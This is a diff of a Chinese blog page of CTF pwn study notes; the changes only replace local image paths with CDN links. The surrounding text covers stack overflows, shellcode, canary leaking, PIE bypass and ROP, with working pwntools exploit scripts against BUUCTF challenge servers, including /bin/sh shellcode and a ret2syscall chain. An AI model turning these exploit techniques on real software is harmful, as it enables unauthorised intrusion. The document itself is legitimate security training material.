@@ -96,10 +96,10 @@ replay-btn" aria-hidden="true"></i></a>
 <h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p><strong>1.ESP</strong>：栈顶指针，指向<strong>栈顶</strong>的低地址</p>
 <p><strong>2.EBP</strong>：栈底指针，指向<strong>栈底</strong>的高地址</p>
 <h2 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h2><p>栈溢出是指程序向<strong>栈中</strong>某个变量中写入的字节数<strong>超过</strong>了这个变量本身所申请的字节数。</p>
-<p>![](F:\er jin zhi\pwn\企业微信截图_17203377649750.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062041724.png"></p>
 <h3 id="pwntools使用"><a href="#pwntools使用" class="headerlink" title="pwntools使用"></a>pwntools使用</h3><h4 id="基本框架"><a href="#基本框架" class="headerlink" title="基本框架"></a>基本框架</h4><p>1.基础脚本</p>
 <p><strong>2是本地，3是远程</strong></p>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240707173158.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062040576.jpg"></p>
 <p>2.基本命令</p>
 <p>cyclic +数字 会随机产生相应长度的字符串</p>
 <p>p+函数名 获得该函数地址</p>
@@ -118,7 +118,7 @@ replay-btn" aria-hidden="true"></i></a>
 <li>将EBX寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:EBX&#x3D;&amp;(“&#x2F;bin&#x2F;sh\x00”)</li>
 <li>将ECX和EDX寄存器的值都设为0:ECX&#x3D;EDX&#x3D;0</li>
 </ul>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240708150843.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042366.jpg"></p>
 <p><strong>asm -r +”32位shellcode”</strong></p>
 <p>2.<strong>64位</strong>系统编写:原理同32位,不过调用的是<strong>syscall</strong></p>
 <p><strong>64位程序当中传递参数不是直接通过栈,而是前6个参数通过寄存器,分别是RDI,RSI,RDX,RCX,R8,R9,第6个参数之后的参数才是通过栈传递的</strong></p>
@@ -127,7 +127,7 @@ replay-btn" aria-hidden="true"></i></a>
 <li>将RDI寄存器的值设置为”&#x2F;bin&#x2F;sh”字符串的地址:RDI&#x3D;&amp;(“&#x2F;bin&#x2F;sh”)</li>
 <li>将RSI和RDX寄存器的值都设为0:RSI&#x3D;RDX&#x3D;0</li>
 </ul>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240708152126.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042718.jpg"></p>
 <p>可以通过pwntools的shellcraft模块来产生合适的shellcode:<strong>shellcraft.sh()</strong></p>
 <p>默认产生的是32位的shellcode,如果要产生64位的shellcode需要先声明系统版本:context(os&#x3D;’linux’,arch&#x3D;’amd64’)</p>
 <h4 id="shellcode示例脚本"><a href="#shellcode示例脚本" class="headerlink" title="shellcode示例脚本"></a><strong>shellcode示例脚本</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27143</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -155,7 +155,7 @@ replay-btn" aria-hidden="true"></i></a>
 <h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h4><p>ROP绕过</p>
 <h3 id="Stack-CANARY"><a href="#Stack-CANARY" class="headerlink" title="Stack(CANARY)"></a>Stack(CANARY)</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RChaos/article/details/105147321">https://blog.csdn.net/RChaos/article/details/105147321</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262846#h2-1">https://www.anquanke.com/post/id/262846#h2-1</a></p>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240716154622.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042734.jpg"></p>
 <p>Stack，栈溢出检查，用Canary是否变化来检测，其中Canary found表示开启。如果<strong>栈中开启Canary found</strong>，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要<strong>通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过。</strong></p>
 <p><strong>泄露栈中canary的思路是1.覆盖canary的低字节\x00，然后连同用户的字符串和剩余的canary部分一起打印出来.2.爆破Canary,见绕过方式2</strong></p>
 <p>泄露条件：</p>
@@ -182,18 +182,17 @@ replay-btn" aria-hidden="true"></i></a>
 </ul>
 <h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1ww_r66KqMTxQyGzdcLphOQ">https://pan.baidu.com/s/1ww_r66KqMTxQyGzdcLphOQ</a><br>提取码：qtor</p>
 <p><strong>WP</strong></p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1721120639303.png"></p>
-<p>![](F:\er jin zhi\pwn\笔记截图\20200329225539162.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042521.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042300.png"></p>
 <p>首先我们计算一下buf到cananry的距离</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\20200330213043657.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042494.png"></p>
 <p>这三个定义的变量中，buf和i的作用是知道的，那么v3就是存储canary的位置，v3的相对位置为esp+0x6c的位置，buf是esp+0x8的位置，所以buf到canary的字节大小为0x6c-0x8&#x3D;0x64&#x3D;100，也可以用ebp相对位置算，结果相同，说明buf需要填充的字节大小为100。</p>
-<p><img src="C:\Users\30451\AppData\Local\Temp\1721121210910.png" alt="72112121091"></p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1721121228511.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062042420.png"></p>
 <p>canary  word的数据形式为0x******00，因为是小端存储，所以在内存最开始的位置存储的是\x00。Canary的值最后两位是0,也就是说是一个字符的大小,如果上面是字符串,写多了一位,刚好把这个00覆盖掉，那么,就能打印出前几位Canary的值.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + <span class="string">&#x27;b&#x27;</span>选择用b来覆盖<span class="number">0x00</span></span><br></pre></td></tr></table></figure>
 
 <p>这就是我们recv到的字符串，所以我们需要优化一下recv（），而且后面出现的cananry是乱码的状态，需要用u32（）解开</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\20200330215610688.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045861.png"></p>
 <p>\x00是填充字符，不影响数据本身，只是为了凑够4个字节的填充物<br>0xf7f242，完整的应该是0xf7f24200，少了个00，说明这正是我们覆盖过的cananry<br>很重要的一点！！！是send不是sendline，sendline会多发送一个‘\n’，如果你使用sendline，那么请不要多发送那个b，这个\n就会覆盖cananry的\x00.</p>
 <p>现在我们已经获得了cananry word了，我们已经写到了cannary的位置，然后我们需要获得canary到ebp的大小，v3的变量已经写了，ebp-0xc，所以是12</p>
 <p><strong>EXP</strong></p>
@@ -204,24 +203,24 @@ replay-btn" aria-hidden="true"></i></a>
 <h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><p>1.BUUCTF  ciscn_2019_n_1</p>
 <p><strong>wp</strong></p>
 <p>查看保护情况，开启NX保护（不可执行shellcode），动态链接</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 193444.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043887.png"></p>
 <p>ida分析</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 194238.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043754.png"></p>
 <p>双击v1和v2，查看变量地址，可以看到两个参数直接的距离是-0x4-（-0x30）&#x3D;0x2c，<strong>就是说我们写入v1数据时候时候在写入0x2c个字节之后在写入11.28125，这样就可以让v2&#x3D;11.28125了</strong></p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 194443.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043539.png"></p>
 <p>细心点的话可以发现程序里面也有11.28125的在内存中16进制的表示</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 194637.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043346.png"></p>
 <p><strong>exp</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25169</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x41348000</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2c</span>+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>2.BUUCTF pwn1_sctf_2016_1</p>
 <p><strong>wp</strong></p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 195730.png)ida分析，shift+F12查看字符串，发现敏感字符串cat flag.txt</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 195524.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043638.png">ida分析，shift+F12查看字符串，发现敏感字符串cat flag.txt</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043934.png"></p>
 <p>F5反编译，进入伪代码，记下函数地址0x8048F0D</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-23 195947.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043377.png"></p>
 <p>进入main函数，分析，s的地址距离返回地址为0x3c+4，从转换开始一个I可以转换成三个字节来算，需要21个I和一个随机的字符即可到达，之后返回到cat flag的位置。</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\7a09bc2dc8a7293d6eb42008fea3b5cf.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043884.png"></p>
 <p>可以看到第13行的fgets是我们的输入点，但是它只读入了32（&#x3D;0x20）长度的数据，<strong>小于0x3c</strong>，没有办法造成溢出，但是这个程序有点意思的地方就在于将一个字节的“I”替换成三个字节的“you”<br>那么思路来了，我们输入20字节的 “I” ，经过第19行的replace函数后会变成60字节的 “you” ，这样就可以进行溢出了，之后覆盖ebp，覆盖返回地址为输出flag的函数地址，就可以完成利用</p>
 <p><strong>exp</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27975</span>)</span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x8048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span>+<span class="string">b&#x27;aaaa&#x27;</span>+p32(flag_addr)</span><br><span class="line"><span class="comment">#payload = b&#x27;I&#x27;*21+b&#x27;a&#x27;+p32(flag_addr)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -241,13 +240,13 @@ replay-btn" aria-hidden="true"></i></a>
 <p><strong>例题</strong>：链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Ej36NzBWt5BouBM7ieWgoA">https://pan.baidu.com/s/1Ej36NzBWt5BouBM7ieWgoA</a><br>提取码：15br</p>
 <p>1.pie_bypass1</p>
 <p>wp</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-18 105919.png)</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2442110-20240618120411127-602180245.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043972.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043456.png"></p>
 <p><code>buf</code>存在栈溢出，同时找到了一个backdoor函数</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2442110-20240618120442571-1052218031.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044100.png"></p>
 <p>backdoor地址可以通过ida找到</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2442110-20240618120751667-608044637.png)</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-18 110202.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062043998.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044967.png"></p>
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">backdoor = <span class="string">b&quot;\xF0&quot;</span> + <span class="string">b&quot;\x06&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * padding + backdoor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	p = process(<span class="string">&quot;./pie_bypass1&quot;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span>(count,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">		p.recvuntil(<span class="string">b&quot;Leave a message!\n&quot;</span>)</span><br><span class="line">		p.send(payload)</span><br><span class="line">		recv = p.recv(timeout=<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
@@ -274,16 +273,16 @@ replay-btn" aria-hidden="true"></i></a>
 <p>通过执行gadgets改变寄存器的值然后控制程序<strong>执行系统调用</strong>(见编写简单的shellcode)</p>
 <p>常用gadgets</p>
 <p>32位</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240710145426.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044112.jpg"></p>
 <p>64位</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\微信图片_20240710151642.jpg)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044360.jpg"></p>
 <h4 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a><strong>例题</strong></h4><p>inndy_rop <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#inndy_rop">BUUCTF在线评测 (buuoj.cn)</a></p>
 <p>cmcc_simplerop <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cmcc_simplerop">BUUCTF在线评测 (buuoj.cn)</a></p>
 <h5 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h5><p>1.checksec 查看保护情况,32位,NX保护(不能用ret2shellcode),静态链接(不能用ret2libc)</p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720753375527.png"></p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720753045679.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044751.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044220.png"></p>
 <p>2.拖入IDA,main函数,进入overflow函数,发现gets,栈溢出</p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720753639048.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044925.png"></p>
 <p>3.将&#x2F;bin&#x2F;sh写入bss段</p>
 <p><strong>第一种方法是去搜索gadget，寻找pop [ecx]这类对地址内容操作的指令</strong>。然后我们利用如下payload可以达到将参数&#x2F;bin&#x2F;sh写入bss段。（<em>并且这部分的payload需要放到返回地址处使用</em>）</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+&#x27;/bin&#x27;</span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+4)+p32(pop_[ecx]_addr)+&#x27;/sh\x00&#x27;</span><br></pre></td></tr></table></figure>
@@ -292,29 +291,29 @@ replay-btn" aria-hidden="true"></i></a>
 <p>首先pop_ecx_addr指的是pop ecx;ret这个指令的地址 bss_addr指的将参数写入bss段的具体地址</p>
 <p>pop_[ecx]_addr指的是pop dword ptr [ecx];ret这个指令的地址 (这里我写[ecx]是为了方便理解，我记得实际的exp里面，不能使用方括号）（另外这里不一定要是ecx，别的寄存器也可以，这里只是举个例子）然后参数&#x2F;bin就是我们的参数</p>
 <p><strong>至于这个bss_addr+4是上面bss_addr的地址的衔接，因为参数&#x2F;bin&#x2F;sh需要两个内存单元存放，因此在这里将上面的地址加4，就存到了下面的内存单元</strong>。最后的\x00是用来声明字符串的结束。</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\企业微信截图_17203377649750.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044815.png"></p>
 <p>第二种方法，等到可以溢出的时候，用rop，<strong>先去把返回地址处放置一个read函数，然后再把&#x2F;bin&#x2F;sh写入指定的地址（把该地址放在read函数第二个参数即可）****然后再随便找一个连续三次pop的指令（不连续应该也是可以的，反正就要进行三次pop，将read函数的三个参数先从栈顶给弹出来）</strong><br>接着再进行ret2syscall，参数传完了，剩下的只要找些gadget片段进行ret2syscall即可。如果没有read函数的话，理论来说我们是可以系统调用read函数的，但是我试了一下，当用int 0x80来系统调用read函数之后，int 0x80指令的后面不是ret指令，没有办法再去衔接后面的gadget了。不过目前还没有遇见过系统调用read函数再ret2syscall的题目。</p>
 <p>当使用这两种方法其中的一种之后，传参完毕，如此剩下的就是去搜寻我们需要的gadget片段，最后系统调用即可。</p>
 <p>4.获得偏移量</p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720754209540.png"></p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720754324165.png"></p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720754413187.png"></p>
-<p><img src="C:\Users\30451\Pictures\Screenshots\1720754475111.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044686.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044344.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044416.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044559.png"></p>
 <p>5.编写exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&quot;i386&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">d=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29334</span>)</span><br><span class="line"><span class="comment">#d=process(&#x27;./rop&#x27;)</span></span><br><span class="line">int_0x80_addr=<span class="number">0x0806c943</span></span><br><span class="line">bss_addr=<span class="number">0x080EBAAE</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"><span class="comment">#bss_addr=e.bss()</span></span><br><span class="line">pop_eax_addr=<span class="number">0x080b8016</span></span><br><span class="line">pop_ebx_addr=<span class="number">0x080481c9</span></span><br><span class="line">pop_ecx_addr=<span class="number">0x080de769</span></span><br><span class="line">pop_edx_addr=<span class="number">0x0806ecda</span></span><br><span class="line">pop_in_ecx_addr=<span class="number">0x0804b5ba</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr) <span class="comment">#利用ecx当一个媒介，以此来让/bin/sh写到bss段，最后的00用来截断，不然execve接收参数的时候，它不知道什么时候参数截止。</span></span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">b&#x27;/bin&#x27;</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p32(pop_in_ecx_addr)+<span class="string">b&#x27;/sh\x00&#x27;</span></span><br><span class="line">payload+=p32(pop_eax_addr)+p32(<span class="number">0xb</span>)</span><br><span class="line">payload+=p32(pop_ebx_addr)+p32(bss_addr)<span class="comment">#把ebx存入参数/bin/sh的地址</span></span><br><span class="line">payload+=p32(pop_ecx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(pop_edx_addr)+p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(int_0x80_addr)</span><br><span class="line">d.sendline(payload)</span><br><span class="line">d.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>2.simplerop</p>
 <p><strong>wp</strong></p>
 <p>查看保护情况，静态链接，NX保护</p>
-<p>![](C:\Users\30451\Pictures\Screenshots\屏幕截图 2024-07-24 155031.png)</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127203918982-250461252.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044717.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044270.png"></p>
 <p>没有canary，并且这里存在溢出，因此我们可以rop。</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127204005942-290500809.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062044037.png"></p>
 <p>我们现在需要去找gadget片段。</p>
 <p><strong>因为我们需要设置eax,ebx,ecx,edx这四个寄存器的参数，因此需要去分别找pop这四个寄存器的指令。</strong></p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127204033314-1369511097.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045594.png"></p>
 <p>这里直接就发现了连续pop三个寄存器的指令，比较nice。</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\2706180-20220127204105424-1865663775.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045181.png"></p>
 <p>寄存器找完了，现在最大的问题就是怎么把&#x2F;bin&#x2F;sh给传进去？</p>
 <p>这道题没有类似于pop [ecx]这类指令，因此我们只能另辟蹊径。</p>
 <p><strong>因为存在read函数(如果没有read函数的话，那就系统调用，不过我试了一下，没成功，但原理上是可行的)<strong>，因此我们可以先把read的地址放到返回地址，再执行一次read，将参数写入我们指定的bss段地址，（</strong>为什么要写入bss段，是因为没开pie的情况下，bss段地址是不变的，并且这道题的bss段是可写，这样我们写入参数之后，直接再拿写入的那个bss地址当做ebx的参数即可，如果是写入栈中的话，还需要泄露栈中地址</strong>）</p>
@@ -326,8 +325,8 @@ replay-btn" aria-hidden="true"></i></a>
 <h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc(*)"></a>ret2libc(*)</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bossfrank/article/details/134872403">https://blog.csdn.net/Bossfrank/article/details/134872403</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17856141.html">https://www.cnblogs.com/falling-dusk/p/17856141.html</a></p>
 <h4 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h4><p>由很多目标文件进行链接形成的是静态库，反之静态库也可以简单地看成是一组目标文件的集合，即很多目标文件经过压缩打包后形成的一个文件，如下图，使用ar命令的-a参数查看静态库的组成：</p>
-<p>![](F:\er jin zhi\pwn\笔记截图\40f16dcdcaf3c8342f711808b682edee.png)</p>
-<p>以下面这个图来简单说明一下从静态链接到可执行文件的过程，根据在源文件中包含的头文件和程序中使用到的库函数，如stdio.h中定义的printf()函数，在libc.a中找到目标文件printf.o(这里暂且不考虑printf()函数的依赖关系)，然后将这个目标文件和我们hello.o这个文件进行链接形成我们的可执行文件。<br>![](F:\er jin zhi\pwn\笔记截图\7e6455e8b7c3faaf6ab19821fa12002b.png)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045789.png"></p>
+<p>以下面这个图来简单说明一下从静态链接到可执行文件的过程，根据在源文件中包含的头文件和程序中使用到的库函数，如stdio.h中定义的printf()函数，在libc.a中找到目标文件printf.o(这里暂且不考虑printf()函数的依赖关系)，然后将这个目标文件和我们hello.o这个文件进行链接形成我们的可执行文件。<br><img src="https://cdn.jsdelivr.net/gh/jesse764/Picture/202504062045236.png"></p>
 <p>​        这里有一个小问题，就是从上面的图中可以看到静态运行库里面的一个目标文件只包含一个函数，如libc.a里面的printf.o只有printf()函数，strlen.o里面只有strlen()函数。</p>
 <p>​        我们知道，链接器在链接静态链接库的时候是以目标文件为单位的。比如我们引用了静态库中的printf()函数，那么链接器就会把库中包含printf()函数的那个目标文件链接进来，如果很多函数都放在一个目标文件中，很可能很多没用的函数都被一起链接进了输出结果中。由于运行库有成百上千个函数，数量非常庞大，每个函数独立地放在一个目标文件中可以尽量减少空间的浪费，那些没有被用到的目标文件就不要链接到最终的输出文件中。</p>
 <p><strong>优缺点</strong></p>
@@ -340,18 +339,18 @@ replay-btn" aria-hidden="true"></i></a>
 <p>虽然动态链接把链接过程推迟到了程序运行时，但是在形成可执行文件时（注意形成可执行文件和执行程序是两个概念），还是需要用到动态链接库。比如我们在形成可执行程序时，发现引用了一个外部的函数，此时会检查动态链接库，发现这个函数名是一个动态链接符号，此时可执行程序就不对这个符号进行重定位，而把这个过程留到装载时再进行。</p>
